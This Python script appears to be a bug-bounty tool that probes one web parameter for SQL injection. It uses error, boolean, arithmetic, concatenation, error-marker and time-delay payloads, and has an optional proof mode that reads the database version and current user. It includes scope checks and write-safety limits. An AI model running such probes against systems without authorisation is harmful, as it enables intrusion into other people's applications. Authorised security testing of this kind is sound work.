#!/usr/bin/env python3
"""Scope-gated SQL injection detector for ONE injection point (class D detect; optional class P proof).

Usage:
  sqli_probe.py --target example.com --url 'https://app.example.com/item?id=FUZZ' --value 39
                [--data 'q=FUZZ' | --json '{"q":"FUZZ"}'] [--header 'Cookie: sid=..; pref=FUZZ'] [--method GET]
                [--dbms mysql,postgres,mssql,oracle,sqlite] [--contexts num,sq,...] [--sleep 3]
                [--families break,boolean,arith,concat,error,time,orderby,like,limit,in] [--col name]
                [--context read|write] [--transform comment,case,...] [--proof] [--delay 0.5] [--max 300]
                [--out artifacts/sqli/probe.tsv] [--insecure]

FUZZ marks the injection point (URL, --data, --json or one --header); --value is the legitimate original value.
Default families: break, boolean, arith/concat, error-marker, time. Replace-mode families (orderby, like, limit, in)
substitute the value instead of appending to it.
Verdicts: ERROR (DBMS error on break that disappears on repair), BOOLEAN (true ~ baseline, false differs, twice),
ARITH/CONCAT (SQL-evaluated value equals baseline), ERROR_MARKER ("bbsq49" computed by the DB), TIME (delay
scales with the requested sleep and vanishes at sleep 0).
Safety: never sends OR, DELETE, stacked writes or data-extraction queries. --context write (default for non-GET)
uses balanced payloads only (no comment terminators, no stacked queries) so a WHERE clause cannot be cut off.
--proof (class P) reads only the DBMS version/current user through the error channel once a marker hit exists.
"""
import argparse
import difflib
import html
import importlib.util
import json
import os
import random
import ssl
import statistics
import subprocess
import sys
import time
import urllib.error
import urllib.request
from urllib.parse import quote, urlsplit

HERE = os.path.dirname(os.path.abspath(__file__))
DBMAP = {"MySQL": "mysql", "PostgreSQL": "postgres", "MSSQL": "mssql", "Oracle": "oracle", "SQLite": "sqlite"}


def load(name):
    spec = importlib.util.spec_from_file_location(name, os.path.join(HERE, name + ".py"))
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


def gate(host):
    script = os.path.normpath(os.path.join(HERE, "..", "..", "..", "..", "scripts", "scope_check.sh"))
    try:
        r = subprocess.run(["bash", script, host], capture_output=True, text=True)
    except FileNotFoundError:
        sys.exit("bash not found; cannot run scope gate")
    sys.stderr.write((r.stdout + r.stderr).strip() + "\n")
    if r.returncode != 0:
        sys.exit(r.returncode)


class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, *args, **kwargs):
        return None


def sim(a, b):
    if a == b:
        return 1.0
    la, lb = a.splitlines()[:3000], b.splitlines()[:3000]
    if max(len(la), len(lb)) < 20:   # short / single-line bodies: compare characters
        return difflib.SequenceMatcher(None, a[:50000], b[:50000], autojunk=False).ratio()
    return difflib.SequenceMatcher(None, la, lb, autojunk=False).ratio()


def main():
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--target", required=True)
    ap.add_argument("--url", required=True)
    ap.add_argument("--value", required=True, help="legitimate original value of the parameter")
    ap.add_argument("--data")
    ap.add_argument("--json")
    ap.add_argument("--header", action="append", default=[])
    ap.add_argument("--method")
    ap.add_argument("--dbms", default="mysql,postgres,mssql,oracle,sqlite")
    ap.add_argument("--contexts")
    ap.add_argument("--families", default="break,boolean,arith,concat,error,time")
    ap.add_argument("--col", help="column name for orderby family (defaults to --value)")
    ap.add_argument("--context", choices=["read", "write"])
    ap.add_argument("--transform", default="")
    ap.add_argument("--sleep", type=int, default=3)
    ap.add_argument("--proof", action="store_true")
    ap.add_argument("--delay", type=float, default=0.5)
    ap.add_argument("--max", type=int, default=300)
    ap.add_argument("--timeout", type=float, default=30)
    ap.add_argument("--out", default="artifacts/sqli/probe.tsv")
    ap.add_argument("--insecure", action="store_true")
    a = ap.parse_args()

    where = [x for x in ("url", "data", "json") if "FUZZ" in (getattr(a, x) or "")] + \
            [h for h in a.header if "FUZZ" in h]
    if len(where) != 1:
        sys.exit("exactly one of --url / --data / --json / --header must contain FUZZ")
    if a.data and a.json:
        sys.exit("use --data or --json, not both")
    if not 1 <= a.sleep <= 5:
        sys.exit("--sleep must be 1..5 seconds")
    method = (a.method or ("POST" if (a.data or a.json) else "GET")).upper()
    if method == "DELETE":
        sys.exit("refusing DELETE: test deletion sinks manually on a throwaway record you own (see SQ-13)")
    ctxmode = a.context or ("read" if method == "GET" else "write")
    write = ctxmode == "write"

    gen, errs = load("sqli_payloads"), load("sqli_errors")
    transforms = [t.strip() for t in a.transform.split(",") if t.strip()]
    for t in transforms:
        gen.transform("x", t)  # validates the name
    raw = bool(set(transforms) & gen.RAW_TRANSFORMS)
    if "newline" in transforms and where[0] not in ("url", "data", "json"):
        sys.exit("newline transform cannot be used in a header")

    host = (urlsplit(a.url).hostname or "").lower()
    t = a.target.lower()
    if host != t and not host.endswith("." + t):
        sys.exit(f"URL host {host} outside target {a.target}")
    gate(host)

    ctx = ssl.create_default_context()
    if a.insecure:
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
    opener = urllib.request.build_opener(NoRedirect, urllib.request.HTTPSHandler(context=ctx))
    base_headers = {"User-Agent": "bbtest-sqli/1.0"}
    if a.data:
        base_headers["Content-Type"] = "application/x-www-form-urlencoded"
    if a.json:
        base_headers["Content-Type"] = "application/json"
    state = {"n": 0}

    def encode(v):
        if where[0] in ("url", "data"):
            return quote(v, safe="%" if raw else "")
        if where[0] == "json":
            return json.dumps(v)[1:-1]
        return v.replace("\r", "").replace("\n", "")

    def send(v):
        if state["n"] >= a.max:
            raise SystemExit("request budget (--max) exhausted")
        state["n"] += 1
        ev = encode(v)
        url = a.url.replace("FUZZ", ev) if where[0] == "url" else a.url
        body = None
        if a.data:
            body = a.data.replace("FUZZ", ev).encode()
        elif a.json:
            body = a.json.replace("FUZZ", ev).encode()
        hdrs = dict(base_headers)
        for h in a.header:
            k, _, hv = h.partition(":")
            hdrs[k.strip()] = hv.strip().replace("FUZZ", ev)
        req = urllib.request.Request(url, data=body, headers=hdrs, method=method)
        t0 = time.monotonic()
        try:
            with opener.open(req, timeout=a.timeout) as r:
                code, b = r.status, r.read(2_000_000)
        except urllib.error.HTTPError as e:
            code, b = e.code, e.read(2_000_000)
        except Exception as e:  # noqa: BLE001
            code, b = 0, str(e).encode()
        el = time.monotonic() - t0
        txt = b.decode("utf-8", "replace")
        if v != a.value:   # strip reflections of the injected value (never the original value itself)
            for form in {v, ev, html.escape(v), html.escape(v, quote=False)}:
                if len(form) > 2:
                    txt = txt.replace(form, "")
        time.sleep(a.delay)
        return code, txt, el

    rows, verdicts = [], []

    def log(fam, ctxn, dbms, variant, payload, code, txt, el, s, note=""):
        rows.append((fam, ctxn, dbms, variant, payload, code, len(txt), int(el * 1000), f"{s:.3f}", note))

    def apply_tr(p):
        for tname in transforms:
            p = gen.transform(p, tname)
        return p

    # ---- baseline ---------------------------------------------------------------------------------
    b = [send(a.value) for _ in range(3)]
    if b[0][0] == 0:
        sys.exit(f"target unreachable: {b[0][1][:120]}")
    bcode, btxt = b[0][0], b[0][1]
    btime = statistics.median(x[2] for x in b)
    bstab = min(sim(b[0][1], b[1][1]), sim(b[0][1], b[2][1]))
    thr = max(0.80, bstab - 0.03)
    berr = {(d, p) for d, p, _ in errs.match(btxt)}
    junk = send(a.value + "bbq" + str(random.randint(1000, 9999)))
    print(f"[*] {method} {where[0]} context={ctxmode} baseline {bcode} {len(btxt)}B {btime * 1000:.0f}ms "
          f"stability={bstab:.3f} threshold={thr:.3f}; junk-value {junk[0]} sim={sim(btxt, junk[1]):.3f}", file=sys.stderr)
    log("baseline", "-", "-", "x3", a.value, bcode, btxt, btime, bstab)

    def same(r, ref=None):
        rc, rt = (bcode, btxt) if ref is None else (ref[0], ref[1])
        return r[0] == rc and sim(rt, r[1]) >= thr

    fams = {f.strip() for f in a.families.split(",")}
    dl = [d.strip() for d in a.dbms.split(",")]
    numeric = a.value.lstrip("-").isdigit()
    cl = [c.strip() for c in a.contexts.split(",")] if a.contexts else (
        ["num", "num-paren", "sq", "dq"] if numeric else ["sq", "dq", "sq-paren", "dq-paren"])
    dbms_seen = set()

    # ---- break / repair ---------------------------------------------------------------------------
    if "break" in fams:
        pl = gen.build(dl, cl, ["break"], write=write)
        candidates = []
        pairs = [(pl[i], pl[i + 1] if i + 1 < len(pl) and pl[i + 1]["variant"] == "repair" else None)
                 for i in range(len(pl)) if pl[i]["variant"] == "break"]
        for br, rp in pairs:
            r = send(a.value + apply_tr(br["payload"]))
            new = [(d, p, line) for d, p, line in errs.match(r[1]) if (d, p) not in berr]
            log("break", "any", new[0][0] if new else "", "break", br["payload"], r[0], r[1], r[2], sim(btxt, r[1]),
                new[0][2] if new else "")
            if new and rp:
                r2 = send(a.value + apply_tr(rp["payload"]))
                new2 = [x for x in errs.match(r2[1]) if (x[0], x[1]) not in berr]
                log("break", "any", "", "repair", rp["payload"], r2[0], r2[1], r2[2], sim(btxt, r2[1]),
                    "error persists" if new2 else "error gone")
                if not new2:
                    dbms_seen.add(new[0][0])
                    verdicts.append(("ERROR", new[0][0], f"break {br['payload']!r} -> {new[0][2][:120]}; "
                                                         f"repair {rp['payload']!r} clean"))
                    candidates = []
                    break
            if new:
                dbms_seen.add(new[0][0])
                candidates.append((new[0][0], f"break {br['payload']!r} -> {new[0][2][:120]} (repair did not clear it)"))
        if candidates:   # DBMS error but no clean repair (typical for numeric contexts) - confirm with boolean/arith
            verdicts.append(("ERROR?", *candidates[0]))

    # ---- boolean ----------------------------------------------------------------------------------
    if "boolean" in fams:
        pl = gen.build(dl, cl, ["boolean"], write=write)
        for i in range(0, len(pl), 2):
            tp, fp = pl[i], pl[i + 1]
            ok = True
            for rnd in range(2):
                rt, rf = send(a.value + apply_tr(tp["payload"])), send(a.value + apply_tr(fp["payload"]))
                if rnd == 0:
                    log("boolean", tp["context"], "", tp["variant"], tp["payload"], *rt, sim(btxt, rt[1]))
                    log("boolean", fp["context"], "", fp["variant"], fp["payload"], *rf, sim(btxt, rf[1]))
                if not (same(rt) and not same(rf) and not same(rf, rt)):
                    ok = False
                    break
            if ok:
                verdicts.append(("BOOLEAN", "", f"context {tp['context']}: true {tp['payload']!r} ~ baseline, "
                                                f"false {fp['payload']!r} differs (2 rounds)"))
                cl = [tp["context"]] + [c for c in cl if c != tp["context"]]   # prefer the proven context
                break

    # ---- arithmetic / concatenation (no quotes needed, no tautology) ------------------------------
    if "arith" in fams and numeric:
        v = int(a.value)
        ctrl = send(str(v + 1))
        if same(ctrl):
            log("arith", "num", "", "control-uninformative", str(v + 1), *ctrl, sim(btxt, ctrl[1]))
        else:
            hits = 0
            for k in (1, 2):
                p = apply_tr(f"{v + k}-{k}")
                r = send(p)
                log("arith", "num", "", "equal-if-evaluated", p, *r, sim(btxt, r[1]))
                hits += same(r)
            if hits == 2:
                verdicts.append(("ARITH", "", f"{v + 1}-1 and {v + 2}-2 return the baseline record for id {v}"))
    if "concat" in fams and not numeric and len(a.value) >= 2:
        if same(junk):
            log("concat", "sq", "", "control-uninformative", "junk", *junk, sim(btxt, junk[1]))
        else:
            k = len(a.value) // 2
            A, B = a.value[:k], a.value[k:]
            for dname, op in (("postgres/oracle/sqlite", "'||'"), ("mysql", "' '"), ("mssql", "'+'")):
                p = A + apply_tr(op) + B
                r = send(p)
                log("concat", "sq", dname, "equal-if-evaluated", p, *r, sim(btxt, r[1]))
                if same(r):
                    verdicts.append(("CONCAT", dname, f"{p!r} returns the same result as {a.value!r}"))
                    break

    # ---- error marker -----------------------------------------------------------------------------
    if "error" in fams:
        known = {DBMAP[d] for d in dbms_seen if d in DBMAP}
        for p in gen.build(dl, cl, ["error"], write=write):
            if known and p["dbms"] not in known:
                continue
            r = send(a.value + apply_tr(p["payload"]))
            hit = "bbsq49" in r[1]
            log("error", p["context"], p["dbms"], p["variant"], p["payload"], *r, sim(btxt, r[1]), "bbsq49" if hit else "")
            if hit:
                verdicts.append(("ERROR_MARKER", p["dbms"], f"{p['payload']!r} -> DB computed 'bbsq'||7*7 = bbsq49"))
                if a.proof:
                    for pp in gen.build([p["dbms"]], [p["context"]], ["proof"], write=write):
                        if pp["variant"] != p["variant"]:
                            continue
                        r2 = send(a.value + apply_tr(pp["payload"]))
                        m = [line for _, _, line in errs.match(r2[1])] or [r2[1][:200]]
                        log("proof", pp["context"], pp["dbms"], pp["variant"], pp["payload"], *r2, 0, m[0][:200])
                        verdicts.append(("PROOF(P)", pp["dbms"], m[0][:200]))
                break

    # ---- time -------------------------------------------------------------------------------------
    def timed(payload, n):
        return send(a.value + apply_tr(payload.replace(f"SLEEP({a.sleep})", f"SLEEP({n})")
                                       .replace(f"PG_SLEEP({a.sleep})", f"PG_SLEEP({n})")
                                       .replace(f"'0:0:{a.sleep}'", f"'0:0:{n}'")
                                       .replace(f"'bbsq',{a.sleep})", f"'bbsq',{n})")))

    if "time" in fams:
        found = False
        for p in gen.build(dl, cl, ["time"], sleep=a.sleep, write=write):
            if p["dbms"] == "sqlite" and dl != ["sqlite"]:
                continue   # RANDOMBLOB is heavy: only when --dbms sqlite is requested alone
            r = timed(p["payload"], a.sleep)
            log(p["family"], p["context"], p["dbms"], p["variant"], p["payload"], *r, sim(btxt, r[1]))
            if r[2] >= btime + a.sleep * 0.85:
                n2 = min(a.sleep + 2, 7)
                r2, r0 = timed(p["payload"], n2), timed(p["payload"], 0)
                log(p["family"], p["context"], p["dbms"], f"confirm-sleep{n2}", p["payload"], *r2, sim(btxt, r2[1]))
                log(p["family"], p["context"], p["dbms"], "confirm-sleep0", p["payload"], *r0, sim(btxt, r0[1]))
                if r2[2] >= btime + n2 * 0.85 and r0[2] < btime + 1.5:
                    verdicts.append(("TIME", p["dbms"], f"{p['payload']!r}: {r[2]:.1f}s @ {a.sleep}, {r2[2]:.1f}s @ {n2}, "
                                                        f"{r0[2]:.1f}s @ 0 (baseline {btime:.1f}s)"))
                    found = True
            if found:
                break

    # ---- replace-mode families --------------------------------------------------------------------
    refs = {}
    for fam in ("orderby", "like", "limit", "in"):
        if fam not in fams:
            continue
        pl = gen.build(dl, cl, [fam], sleep=a.sleep, col=a.col or a.value, write=write)
        byv = {p["variant"]: p["payload"] for p in pl}
        ref = (bcode, btxt) if fam in ("orderby", "in") else refs.setdefault(fam, send("%" if fam == "like" else "1"))
        for tv, fv in (("true", "false"), ("mysql-if-true", "mysql-if-false"), ("sq-true", "sq-false")):
            if tv not in byv:
                continue
            mk = (lambda x: a.value + x) if fam == "in" else (lambda x: x)
            rt, rf = send(mk(apply_tr(byv[tv]))), send(mk(apply_tr(byv[fv])))
            log(fam, "replace", "", tv, byv[tv], *rt, sim(ref[1], rt[1]))
            log(fam, "replace", "", fv, byv[fv], *rf, sim(ref[1], rf[1]))
            if same(rt, ref) and not same(rf, ref):
                verdicts.append(("BOOLEAN", fam, f"{fam}: {byv[tv]!r} ~ reference, {byv[fv]!r} differs"))
                break
        for tv in [v for v in byv if v.startswith("time-")]:
            r = send(apply_tr(byv[tv]))
            log(fam, "replace", tv[5:], tv, byv[tv], *r, sim(btxt, r[1]))
            if r[2] >= btime + a.sleep * 0.85:
                r0 = send(apply_tr(byv[tv].replace(f"({a.sleep})", "(0)")))
                log(fam, "replace", tv[5:], "confirm-sleep0", byv[tv], *r0, sim(btxt, r0[1]))
                if r0[2] < btime + 1.5:
                    verdicts.append(("TIME", tv[5:], f"{fam}: {byv[tv]!r} {r[2]:.1f}s vs sleep0 {r0[2]:.1f}s"))

    os.makedirs(os.path.dirname(a.out) or ".", exist_ok=True)
    with open(a.out, "w", encoding="utf-8") as fh:
        fh.write("family\tcontext\tdbms\tvariant\tpayload\tstatus\tbytes\tms\tsim_to_ref\tnote\n")
        for r in rows:
            fh.write("\t".join(str(x).replace("\t", " ").replace("\n", " ") for x in r) + "\n")
    with open(os.path.splitext(a.out)[0] + "_verdicts.json", "w", encoding="utf-8") as fh:
        json.dump({"url": a.url, "where": where[0], "context": ctxmode, "transforms": transforms, "requests": state["n"],
                   "verdicts": [dict(type=v[0], dbms=v[1], evidence=v[2]) for v in verdicts]}, fh, indent=2)
    for v in verdicts:
        print(f"!! {v[0]:<13} {v[1]:<22} {v[2]}")
    print(f"[+] {state['n']} requests, {len(verdicts)} signals -> {a.out}")
    if not verdicts:
        print("    No signal. Try other contexts/--families, --transform for filters, or OOB (SQ-08) for async sinks.")


if __name__ == "__main__":
    main()
